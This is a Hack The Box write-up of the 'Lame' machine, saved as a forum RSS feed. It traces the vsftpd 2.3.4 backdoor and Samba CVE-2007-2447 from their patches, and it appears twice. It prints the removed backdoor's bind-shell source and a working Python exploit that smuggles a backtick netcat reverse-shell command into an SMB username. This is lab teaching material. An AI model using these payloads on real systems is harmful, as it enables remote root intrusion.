@@ -1,0 +1,544 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Through the looking glass: LAME</title>
+    <link>https://0x00sec.org/t/through-the-looking-glass-lame/19149</link>
+    <description>Hey everybody, welcome to my first post on 0x00sec and hopefully the first of many in this *Through The Looking Glass* series.
+
+# The Purpose
+A lot of Writeups are very straightforward, you nmap the server, you find the vulnerable service. You searchsploit &#39;vulnerable service and version&#39;, you load the appropriate msf-module and flags are raining across the screen.
+
+I wanted to have a better look at how these exploits work, and how we can find and create exploits just by looking at patches and the like.
+
+For advanced CTF&#39;ers and Pwners this won&#39;t be anything new, it might not be new if you&#39;ve read vulnerability analysis, but I hope it can be a good resource for new people who are interested in how this stuff all comes together. ( And it&#39;s a good way to try and force myself to contribute :-) )
+
+With that out of the way,...
+
+#  Enter LAME (vsftpd 2.3.4 backdoor and CVE-2007-2447)
+
+I wanted to start bigger, and not use vulnerability scanners. 
+Because of this, I started out with my nmap portscan, and just began my journey on the lowest port.
+
+    21/tcp   open  ftp         vsftpd 2.3.4
+    22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+    139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+    445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+    3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+
+## vsftpd 2.3.4 and vsf_sysutil_extra backdoor
+
+Because the year is 2020 and news spreads fast, when I started my dumb approach of vsftpd, the term backdoor immediately got thrown in my face upon the first Google search.
+
+It turns out that, at some point in time, someone had managed to build a backdoor into vsftpd.
+
+Armed with this knowledge, I found a blog post by the maintainer of vsftpd that contained a link to pastebin, where a diff was shown from after the backdoor was removed (longer code ahead):
+
+
+[details=&quot;Full Patch&quot;]
+    diff -ur vsftpd-2.3.4/str.c vsftpd-2.3.4.4players/str.c
+    --- vsftpd-2.3.4/str.c  2011-06-30 15:52:38.000000000 +0200
+    +++ vsftpd-2.3.4.4players/str.c 2008-12-17 06:54:16.000000000 +0100
+    @@ -569,11 +569,6 @@
+    {
+           return 1;
+    }
+    -    else if((p_str-&gt;p_buf[i]==0x3a)
+    -    &amp;&amp; (p_str-&gt;p_buf[i+1]==0x29))
+    -    {
+    -      vsf_sysutil_extra();
+    -    }
+    }
+       return 0;
+     }
+    Only in vsftpd-2.3.4: str.o
+    Only in vsftpd-2.3.4: strlist.o
+    diff -ur vsftpd-2.3.4/sysdeputil.c vsftpd-2.3.4.4players/sysdeputil.c
+    --- vsftpd-2.3.4/sysdeputil.c   2011-06-30 15:58:00.000000000 +0200
+    +++ vsftpd-2.3.4.4players/sysdeputil.c  2010-03-26 04:25:33.000000000 +0100
+    @@ -34,10 +34,7 @@
+     /* For FreeBSD */
+     #include &lt;sys/param.h&gt;
+     #include &lt;sys/uio.h&gt;
+    -#include &lt;netinet/in.h&gt;
+    -#include &lt;netdb.h&gt;
+    -#include &lt;string.h&gt;
+    -#include &lt;stdlib.h&gt;
+    +
+     #include &lt;sys/prctl.h&gt;
+     #include &lt;signal.h&gt;
+     
+    @@ -220,7 +217,7 @@
+     static int s_proctitle_inited = 0;
+     static char* s_p_proctitle = 0;
+     #endif
+    -int vsf_sysutil_extra();
+    +
+     #ifndef VSF_SYSDEP_HAVE_MAP_ANON
+     #include &lt;sys/types.h&gt;
+     #include &lt;sys/stat.h&gt;
+    @@ -843,30 +840,6 @@
+    }
+     }
+     
+    -int
+    -vsf_sysutil_extra(void)
+    -{
+    -  int fd, rfd;
+    -  struct sockaddr_in sa;
+    -  if((fd = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0)
+    -  exit(1);
+    -  memset(&amp;sa, 0, sizeof(sa));
+    -  sa.sin_family = AF_INET;
+    -  sa.sin_port = htons(6200);
+    -  sa.sin_addr.s_addr = INADDR_ANY;
+    -  if((bind(fd,(struct sockaddr *)&amp;sa,
+    -  sizeof(struct sockaddr))) &lt; 0) exit(1);
+    -  if((listen(fd, 100)) == -1) exit(1);
+    -  for(;;)
+    -  {
+    -    rfd = accept(fd, 0, 0);
+    -    close(0); close(1); close(2);
+    -    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
+    -    execl(&quot;/bin/sh&quot;,&quot;sh&quot;,(char *)0);
+    -  }
+    -}
+    -
+    -
+     void
+     vsf_sysutil_set_proctitle_prefix(const struct mystr* p_str)
+     {
+[/details]
+
+
+If you&#39;ve ever programmed sockets in C, You immediately recognize the part where the TCP Server is being set up, if you don&#39;t, [Here](https://www.binarytides.com/socket-programming-c-linux-tutorial/)&#39;s a good read :slight_smile:
+
+    -  sa.sin_family = AF_INET;
+    -  sa.sin_port = htons(6200);
+    -  sa.sin_addr.s_addr = INADDR_ANY;
+    -  if((bind(fd,(struct sockaddr *)&amp;sa,
+    -  sizeof(struct sockaddr))) &lt; 0) exit(1);
+    -  if((listen(fd, 100)) == -1) exit(1);
+    -  for(;;)
+    -  {
+    -    rfd = accept(fd, 0, 0);
+    -    close(0); close(1); close(2);
+    -    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
+    -    execl(&quot;/bin/sh&quot;,&quot;sh&quot;,(char *)0);
+
+So a TCP Server is being set up on port 6200 in this function, and then it just accepts any connection and pipe&#39;s everything from and to /bin/sh.
+
+The other part shows us how we can trigger this function:
+
+    -    else if((p_str-&gt;p_buf[i]==0x3a)
+    -    &amp;&amp; (p_str-&gt;p_buf[i+1]==0x29))
+    -    {
+    -      vsf_sysutil_extra();
+    -    }
+    }
+
+We have this mysterious buffer called p_buf that&#39;s a member of p_str, and if the i&#39;d and i+1&#39;d character respectively are 0x3a and 0x29, it runs the vsf_sysutil_extra() function, effectively setting up the backdoor on port 6200.
+
+The snake quickly shows us what these bytes are:
+
+    &gt;&gt;&gt; s = b&#39;\x3a\x29&#39;
+    &gt;&gt;&gt; s.encode(&#39;utf-8&#39;)
+    &#39;:)&#39;
+
+Because I couldn&#39;t find the original source code for vsftpd 2.3.4 that had this vulnerability, I later found out that one of the things that enters p_str&#39;s p_buf, is the username.
+
+So all we have to do to trigger the backdoor is enter a smileyface for the username, and the backdoor should spawn on 6200.
+
+    jarvis@kali:~/Documents/research$ ftp 10.10.10.3
+    Connected to 10.10.10.3.
+    220 (vsFTPd 2.3.4)
+    Name (10.10.10.3:jarvis): :)
+    331 Please specify the password.
+    Password: (eehm wtf?)
+    530 Login incorrect.
+    Login failed.
+    ftp&gt; exit
+    221 Goodbye.
+
+So after 2 hours of trying to find the details of this vulnerability, finding an anticlimactic tcp bind backdoor, it turns out it&#39;s anti-anticlimactically patched ! Seems like this box didn&#39;t steal its name :smiley: 
+
+## Samba 3.0.20
+
+Because I didn&#39;t have smbv1 enabled, my machine couldn&#39;t properly communicate with the server&#39;s smbd and I had no idea where to start with this approach. 
+I could just load every samba exploit into metasploit, and I&#39;d probably find one that works, but that wont be interesting and I wont learn from that.
+
+I later ran into [this](https://github.com/blark/checksmbv1/blob/master/checksmbv1.py) script, that uses the amazing impacket library to test for smbv1.
+
+Lo and behold:
+
+    jarvis@ubuntu:~/Tools$ python3 check_smb1.py 10.10.10.3
+    Attempting SMBv1 connection to 10.10.10.3...
+    Success!
+
+Now that we know this, we ran smbclient from our smbv1 enabled machine and quickly found a correct version number: 3.0.20.
+I started looking around CVEDetails and found [this nice little CVE](https://www.cvedetails.com/cve/CVE-2007-2447/).
+
+&gt; The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the &quot;username map script&quot; smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.
+
+It&#39;s a very long shot, because it requires a non-default option to be turned on. But it&#39;s a solid exploit and certainly worth a try from this point of view.
+
+We find a patch for 3 vulnerabilities for version 3.0.24:
+
+![image|690x428](upload://qGZXEGkwkuxsTVHyQJykGljnWNd.png) 
+
+Which also has our CVE-2007-2447.
+A link to the full patch is [here](https://www.samba.org/samba/ftp/patches/security/samba-3.0.24-CVE-2007-2447_v2.patch) if you want to read it, I&#39;ll only include relevant parts below.
+
+I downloaded the 3.0.24 source code, applied the patch and started a comparison in Meld (I don&#39;t like reading raw patch notes, sue me).
+
+A first indicator of a possible fix was here:
+
+![image|690x28](upload://4Cv3baawSQqnLpeaar4pQNsGIor.png) 
+
+They added an option to the smbrun function to toggle sanitizing.
+Does that mean stuff didn&#39;t get sanitized before?
+
+And that&#39;s when we see it in all its glory:
+
+![image|690x105](upload://t1AWFXdSXY6GDS1TekiKmd9cPMS.png) 
+
+What this means, is that if we have ANY saying over what&#39;s in &#39;cmd&#39;, we might just have found our RCE.
+
+I quickly grep the source files for uses of this smb function and notice something interesting:
+
+
+[details=&quot;Full Grep&quot;]
+    jarvis@kali:~/Documents/research/samba-3.0.24/source$ grep -ir &#39;smbrun(&#39;
+    passdb/pdb_interface.c:         add_ret = smbrun(add_script,NULL);
+    passdb/pdb_interface.c: ret = smbrun(del_script,NULL);
+    passdb/pdb_tdb.c:       rename_ret = smbrun(rename_script, NULL);
+    passdb/pdb_ldap.c:      rc = smbrun(rename_script, NULL);
+    passdb/pdb_smbpasswd.c:         rename_ret = smbrun(rename_script, NULL);
+    printing/print_generic.c:       ret = smbrun(syscmd,outfd);
+    smbd/map_username.c:            ret = smbrun(command, &amp;fd);
+    smbd/service.c:         ret = smbrun(cmd,NULL);
+    smbd/service.c:         ret = smbrun(cmd,NULL);
+    smbd/service.c:         smbrun(cmd,NULL);
+    smbd/service.c:         smbrun(cmd,NULL);
+    smbd/close.c:           ret = smbrun(fname,&amp;tmp_fd);
+    smbd/lanman.c:          if ((res = smbrun(command, NULL)) != 0) {
+    smbd/message.c:         smbrun(s,NULL);
+    lib/smbrun.c:This is a utility function of smbrun().
+    lib/smbrun.c:int smbrun(const char *cmd, int *outfd)
+    nmbd/nmbd_winsserver.c: smbrun(command, NULL);
+    utils/net_rpc_samsync.c:                        add_ret = smbrun(add_script,NULL);
+    services/svc_rcinit.c:  ret = smbrun( command , &amp;fd );
+    services/svc_rcinit.c:  ret = smbrun( command , &amp;fd );
+    services/svc_rcinit.c:  ret = smbrun( command , &amp;fd );
+    auth/auth_util.c:       ret = smbrun(add_script,NULL);
+    auth/auth_util.c:       if (smbrun(command, NULL) != 0) {
+    rpc_server/srv_srvsvc_nt.c:             if ( (ret = smbrun(command, NULL)) == 0 ) {
+    rpc_server/srv_srvsvc_nt.c:     if ( (ret = smbrun(command, NULL)) == 0 ) {
+    rpc_server/srv_srvsvc_nt.c:     if ( (ret = smbrun(command, NULL)) == 0 ) {
+    rpc_server/srv_spoolss_nt.c:    if ( (ret = smbrun(command, NULL)) == 0 ) {
+    rpc_server/srv_spoolss_nt.c:    ret = smbrun(command, &amp;fd);
+    rpc_server/srv_spoolss_nt.c:    if ( (ret = smbrun(command, &amp;fd)) == 0 ) {
+    rpc_server/srv_spoolss_nt.c:            ret = smbrun(command, &amp;fd);
+    rpc_server/srv_reg_nt.c:        ret = smbrun( shutdown_script, NULL );
+    rpc_server/srv_reg_nt.c:        ret = smbrun( abort_shutdown_script, NULL );
+    groupdb/mapping.c:              ret = smbrun(add_script, &amp;fd);
+    groupdb/mapping.c:              ret = smbrun(del_script,NULL);
+    groupdb/mapping.c:              ret = smbrun(add_script,NULL);
+    groupdb/mapping.c:              ret = smbrun(add_script,NULL);
+    groupdb/mapping.c:              ret = smbrun(del_script,NULL);
+[/details]
+
+There&#39;s this line:
+
+    smbd/map_username.c:            ret = smbrun(command, &amp;fd);
+
+CVEDetails clearly made note of the &quot;username map script&quot; being enabled in the config.
+When reading the comments, we notice that&#39;s pretty much gonna be all there&#39;s to it:
+
+&gt;...
+This is the main function that should be called *once* on
+any incoming or new username - in order to canonicalize the name.
+...
+
+So, if the script is enabled, on every incoming connection this command will be called?
+
+And then we see how we might get our input into the cmd variable:
+
+    pstr_sprintf( command, &quot;%s \&quot;%s\&quot;&quot;, cmd, user );
+    ret = smbrun(command, &amp;fd);
+
+This basically creates a string &#39;some_command &quot;user&quot;&#39; and passes it to smbrun.
+smbrun in turn, just execl&#39;s this without sanitizing.
+
+## The exploit
+
+We know this function takes a hardcoded or variable &#39;map user&#39; command, and then appends our username to it, this makes its way to execl and gets piped into /bin/sh -c.
+
+When adding backticks, (which are specifically filtered after the patch), you will execute the command inside those backticks before passing it to the outer command.
+
+So what would happen if our username was Jimmy`ls` ?
+
+Our command string would become map_user_command &quot;Jimmy`ls`&quot;
+
+So what if our map_user_command hypothetically is echo ?
+
+    jarvis@kali:~/Documents/research$ echo &quot;Jimmy`ls`&quot;
+    Jimmysamba-3.0.24
+    samba-3.0.24-patched
+    samba-3.0.24.tar.gz
+    samba.patch
+
+I quickly grabbed the SMBv1 checker, and modified it to send a netcat reverse shell payload.
+
+    from impacket.smbconnection import SMBConnection, smb
+    import click
+    @click.command()
+    @click.argument(&#39;ip&#39;)
+    @click.argument(&#39;rev_shell_ip&#39;)
+    @click.argument(&#39;rev_shell_port&#39;)
+    def check_smbv1(ip, rev_shell_ip, rev_shell_port):
+        click.echo(f&#39;Attempting SMBv1 connection to {ip}&#39;, nl=False)
+        try:
+            s = SMBConnection(&#39;*SMBSERVER&#39;, ip, preferredDialect=smb.SMB_DIALECT)
+            if isinstance(s, SMBConnection):
+                click.secho(&#39;Success!&#39;, fg=&#39;green&#39;)
+                click.secho(&#39;Attempting to send PoC exploit payload...&#39;, fg=&#39;yellow&#39;)
+                s.login(b&#39;Jimmy`nc 10.10.14.30 4444 -e /bin/bash`&#39;, &#39;fakepass&#39;)
+        except Exception as e:
+            click.secho(&#39;Failed...&#39;, fg=&#39;red&#39;, nl=False)
+            click.echo(e)
+            return
+    if __name__ == &#39;__main__&#39;:
+        check_smbv1()
+
+And the magic came all together:
+
+![image|689x85](upload://t1bjTNokvwUQjbClM7i2HhYpAno.png) 
+
+Because SMBd was running as root, this was pretty much all there is to this machine.
+
+I hoped you enjoyed reading, if you have questions or tips let me know, dont forget to &lt;3 the post if you liked it, so I know I can do more of this basic stuff on here!
+
+Ah, I allmost forgot the flags!
+
+
+[details=&quot;Summary&quot;]
+Get your own flags, lazy :laughing:
+[/details]
+
+
+Thanks all,
+
+Jarvis</description>
+    
+    <lastBuildDate>Wed, 12 Feb 2020 09:29:39 +0000</lastBuildDate>
+    <category>Hackthebox Writeups</category>
+    <atom:link href="https://0x00sec.org/t/through-the-looking-glass-lame/19149.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Through the looking glass: LAME</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
+          <p><a href="https://0x00sec.org/t/through-the-looking-glass-lame/19149/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/through-the-looking-glass-lame/19149/4</link>
+        <pubDate>Fri, 12 Jun 2020 10:48:35 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-19149-4</guid>
+        <source url="https://0x00sec.org/t/through-the-looking-glass-lame/19149.rss">Through the looking glass: LAME</source>
+      </item>
+      <item>
+        <title>Through the looking glass: LAME</title>
+        <dc:creator><![CDATA[Jarvis]]></dc:creator>
+        <description><![CDATA[
+            <p>Thanks for the feedback, much appreciated and it will be put to good use! At some point your own routine becomes so normal you take a lot of it for granted.</p>
+<p>I tried to zoom and focus more specifically on what happens when you enter ‘run’ in metasploit because I felt like the rest is mostly well represented in terms of documentation online.</p>
+<p>I’ll try to include a bit more detail or information about my toolchain in the next post.</p>
+<p>Glad you enjoyed it!</p>
+          <p><a href="https://0x00sec.org/t/through-the-looking-glass-lame/19149/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/through-the-looking-glass-lame/19149/3</link>
+        <pubDate>Wed, 12 Feb 2020 09:29:39 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-19149-3</guid>
+        <source url="https://0x00sec.org/t/through-the-looking-glass-lame/19149.rss">Through the looking glass: LAME</source>
+      </item>
+      <item>
+        <title>Through the looking glass: LAME</title>
+        <dc:creator><![CDATA[Danus]]></dc:creator>
+        <description><![CDATA[
+            <p>The post looks good and as a person that mostly doesn’t do pentesting it was a fun read!</p>
+<p>How ever I felt like you were more explaining it to yourself rather to everyone else, meaning that you mention patch notes, exploits and tools that you use but you never explain what they do and whats their use or give any background detail about whats going on. I would much more enjoy this write up if I  could understand what are you doing and why exactly you are doing it and since its intended for beginners I was kinda expecting that</p>
+<p>Overall you put a lot of effort into it and I enjoyed reading it and I do hope you make another post like this soon because I really like it when people try to think out side the box and make something of their own rather than create something that was seen on a simple google search a million times <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
+          <p><a href="https://0x00sec.org/t/through-the-looking-glass-lame/19149/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/through-the-looking-glass-lame/19149/2</link>
+        <pubDate>Tue, 11 Feb 2020 22:05:30 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-19149-2</guid>
+        <source url="https://0x00sec.org/t/through-the-looking-glass-lame/19149.rss">Through the looking glass: LAME</source>
+      </item>
+      <item>
+        <title>Through the looking glass: LAME</title>
+        <dc:creator><![CDATA[Jarvis]]></dc:creator>
+        <description><![CDATA[
+            <p>Hey everybody, welcome to my first post on 0x00sec and hopefully the first of many in this <em>Through The Looking Glass</em> series.</p>
+<h1>The Purpose</h1>
+<p>A lot of Writeups are very straightforward, you nmap the server, you find the vulnerable service. You searchsploit ‘vulnerable service and version’, you load the appropriate msf-module and flags are raining across the screen.</p>
+<p>I wanted to have a better look at how these exploits work, and how we can find and create exploits just by looking at patches and the like.</p>
+<p>For advanced CTF’ers and Pwners this won’t be anything new, it might not be new if you’ve read vulnerability analysis, but I hope it can be a good resource for new people who are interested in how this stuff all comes together. ( And it’s a good way to try and force myself to contribute <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> )</p>
+<p>With that out of the way,…</p>
+<h1>Enter LAME (vsftpd 2.3.4 backdoor and CVE-2007-2447)</h1>
+<p>I wanted to start bigger, and not use vulnerability scanners.<br>
+Because of this, I started out with my nmap portscan, and just began my journey on the lowest port.</p>
+<pre><code>21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+</code></pre>
+<h2>vsftpd 2.3.4 and vsf_sysutil_extra backdoor</h2>
+<p>Because the year is 2020 and news spreads fast, when I started my dumb approach of vsftpd, the term backdoor immediately got thrown in my face upon the first Google search.</p>
+<p>It turns out that, at some point in time, someone had managed to build a backdoor into vsftpd.</p>
+<p>Armed with this knowledge, I found a blog post by the maintainer of vsftpd that contained a link to pastebin, where a diff was shown from after the backdoor was removed (longer code ahead):</p>
+
+Full Patch <a href="https://0x00sec.org/t/through-the-looking-glass-lame/19149/1">(click for more details)</a>
+<p>If you’ve ever programmed sockets in C, You immediately recognize the part where the TCP Server is being set up, if you don’t, <a href="https://www.binarytides.com/socket-programming-c-linux-tutorial/" rel="nofollow noopener">Here</a>’s a good read <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+<pre><code>-  sa.sin_family = AF_INET;
+-  sa.sin_port = htons(6200);
+-  sa.sin_addr.s_addr = INADDR_ANY;
+-  if((bind(fd,(struct sockaddr *)&amp;sa,
+-  sizeof(struct sockaddr))) &lt; 0) exit(1);
+-  if((listen(fd, 100)) == -1) exit(1);
+-  for(;;)
+-  {
+-    rfd = accept(fd, 0, 0);
+-    close(0); close(1); close(2);
+-    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
+-    execl("/bin/sh","sh",(char *)0);
+</code></pre>
+<p>So a TCP Server is being set up on port 6200 in this function, and then it just accepts any connection and pipe’s everything from and to /bin/sh.</p>
+<p>The other part shows us how we can trigger this function:</p>
+<pre><code>-    else if((p_str-&gt;p_buf[i]==0x3a)
+-    &amp;&amp; (p_str-&gt;p_buf[i+1]==0x29))
+-    {
+-      vsf_sysutil_extra();
+-    }
+}
+</code></pre>
+<p>We have this mysterious buffer called p_buf that’s a member of p_str, and if the i’d and i+1’d character respectively are 0x3a and 0x29, it runs the vsf_sysutil_extra() function, effectively setting up the backdoor on port 6200.</p>
+<p>The snake quickly shows us what these bytes are:</p>
+<pre><code>&gt;&gt;&gt; s = b'\x3a\x29'
+&gt;&gt;&gt; s.encode('utf-8')
+':)'
+</code></pre>
+<p>Because I couldn’t find the original source code for vsftpd 2.3.4 that had this vulnerability, I later found out that one of the things that enters p_str’s p_buf, is the username.</p>
+<p>So all we have to do to trigger the backdoor is enter a smileyface for the username, and the backdoor should spawn on 6200.</p>
+<pre><code>jarvis@kali:~/Documents/research$ ftp 10.10.10.3
+Connected to 10.10.10.3.
+220 (vsFTPd 2.3.4)
+Name (10.10.10.3:jarvis): :)
+331 Please specify the password.
+Password: (eehm wtf?)
+530 Login incorrect.
+Login failed.
+ftp&gt; exit
+221 Goodbye.
+</code></pre>
+<p>So after 2 hours of trying to find the details of this vulnerability, finding an anticlimactic tcp bind backdoor, it turns out it’s anti-anticlimactically patched ! Seems like this box didn’t steal its name <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
+<h2>Samba 3.0.20</h2>
+<p>Because I didn’t have smbv1 enabled, my machine couldn’t properly communicate with the server’s smbd and I had no idea where to start with this approach.<br>
+I could just load every samba exploit into metasploit, and I’d probably find one that works, but that wont be interesting and I wont learn from that.</p>
+<p>I later ran into <a href="https://github.com/blark/checksmbv1/blob/master/checksmbv1.py" rel="nofollow noopener">this</a> script, that uses the amazing impacket library to test for smbv1.</p>
+<p>Lo and behold:</p>
+<pre><code>jarvis@ubuntu:~/Tools$ python3 check_smb1.py 10.10.10.3
+Attempting SMBv1 connection to 10.10.10.3...
+Success!
+</code></pre>
+<p>Now that we know this, we ran smbclient from our smbv1 enabled machine and quickly found a correct version number: 3.0.20.<br>
+I started looking around CVEDetails and found <a href="https://www.cvedetails.com/cve/CVE-2007-2447/" rel="nofollow noopener">this nice little CVE</a>.</p>
+<blockquote>
+<p>The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the “username map script” smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.</p>
+</blockquote>
+<p>It’s a very long shot, because it requires a non-default option to be turned on. But it’s a solid exploit and certainly worth a try from this point of view.</p>
+<p>We find a patch for 3 vulnerabilities for version 3.0.24:</p>
+<p><span alt="image" data-base62-sha1="qGZXEGkwkuxsTVHyQJykGljnWNd" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
+<p>Which also has our CVE-2007-2447.<br>
+A link to the full patch is <a href="https://www.samba.org/samba/ftp/patches/security/samba-3.0.24-CVE-2007-2447_v2.patch" rel="nofollow noopener">here</a> if you want to read it, I’ll only include relevant parts below.</p>
+<p>I downloaded the 3.0.24 source code, applied the patch and started a comparison in Meld (I don’t like reading raw patch notes, sue me).</p>
+<p>A first indicator of a possible fix was here:</p>
+<p><span alt="image" data-base62-sha1="4Cv3baawSQqnLpeaar4pQNsGIor" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
+<p>They added an option to the smbrun function to toggle sanitizing.<br>
+Does that mean stuff didn’t get sanitized before?</p>
+<p>And that’s when we see it in all its glory:</p>
+<p><span alt="image" data-base62-sha1="t1AWFXdSXY6GDS1TekiKmd9cPMS" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
+<p>What this means, is that if we have ANY saying over what’s in ‘cmd’, we might just have found our RCE.</p>
+<p>I quickly grep the source files for uses of this smb function and notice something interesting:</p>
+
+Full Grep <a href="https://0x00sec.org/t/through-the-looking-glass-lame/19149/1">(click for more details)</a>
+<p>There’s this line:</p>
+<pre><code>smbd/map_username.c:            ret = smbrun(command, &amp;fd);
+</code></pre>
+<p>CVEDetails clearly made note of the “username map script” being enabled in the config.<br>
+When reading the comments, we notice that’s pretty much gonna be all there’s to it:</p>
+<blockquote>
+<p>…<br>
+This is the main function that should be called <em>once</em> on<br>
+any incoming or new username - in order to canonicalize the name.<br>
+…</p>
+</blockquote>
+<p>So, if the script is enabled, on every incoming connection this command will be called?</p>
+<p>And then we see how we might get our input into the cmd variable:</p>
+<pre><code>pstr_sprintf( command, "%s \"%s\"", cmd, user );
+ret = smbrun(command, &amp;fd);
+</code></pre>
+<p>This basically creates a string ‘some_command “user”’ and passes it to smbrun.<br>
+smbrun in turn, just execl’s this without sanitizing.</p>
+<h2>The exploit</h2>
+<p>We know this function takes a hardcoded or variable ‘map user’ command, and then appends our username to it, this makes its way to execl and gets piped into /bin/sh -c.</p>
+<p>When adding backticks, (which are specifically filtered after the patch), you will execute the command inside those backticks before passing it to the outer command.</p>
+<p>So what would happen if our username was Jimmy<code>ls</code> ?</p>
+<p>Our command string would become map_user_command “Jimmy<code>ls</code>”</p>
+<p>So what if our map_user_command hypothetically is echo ?</p>
+<pre><code>jarvis@kali:~/Documents/research$ echo "Jimmy`ls`"
+Jimmysamba-3.0.24
+samba-3.0.24-patched
+samba-3.0.24.tar.gz
+samba.patch
+</code></pre>
+<p>I quickly grabbed the SMBv1 checker, and modified it to send a netcat reverse shell payload.</p>
+<pre><code>from impacket.smbconnection import SMBConnection, smb
+import click
+@click.command()
+@click.argument('ip')
+@click.argument('rev_shell_ip')
+@click.argument('rev_shell_port')
+def check_smbv1(ip, rev_shell_ip, rev_shell_port):
+    click.echo(f'Attempting SMBv1 connection to {ip}', nl=False)
+    try:
+        s = SMBConnection('*SMBSERVER', ip, preferredDialect=smb.SMB_DIALECT)
+        if isinstance(s, SMBConnection):
+            click.secho('Success!', fg='green')
+            click.secho('Attempting to send PoC exploit payload...', fg='yellow')
+            s.login(b'Jimmy`nc 10.10.14.30 4444 -e /bin/bash`', 'fakepass')
+    except Exception as e:
+        click.secho('Failed...', fg='red', nl=False)
+        click.echo(e)
+        return
+if __name__ == '__main__':
+    check_smbv1()
+</code></pre>
+<p>And the magic came all together:</p>
+<p><span alt="image" data-base62-sha1="t1bjTNokvwUQjbClM7i2HhYpAno" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
+<p>Because SMBd was running as root, this was pretty much all there is to this machine.</p>
+<p>I hoped you enjoyed reading, if you have questions or tips let me know, dont forget to &lt;3 the post if you liked it, so I know I can do more of this basic stuff on here!</p>
+<p>Ah, I allmost forgot the flags!</p>
+
+Summary <a href="https://0x00sec.org/t/through-the-looking-glass-lame/19149/1">(click for more details)</a>
+<p>Thanks all,</p>
+<p>Jarvis</p>
+          <p><a href="https://0x00sec.org/t/through-the-looking-glass-lame/19149/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/through-the-looking-glass-lame/19149/1</link>
+        <pubDate>Tue, 11 Feb 2020 18:48:34 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-19149-1</guid>
+        <source url="https://0x00sec.org/t/through-the-looking-glass-lame/19149.rss">Through the looking glass: LAME</source>
+      </item>
+  </channel>
+</rss>
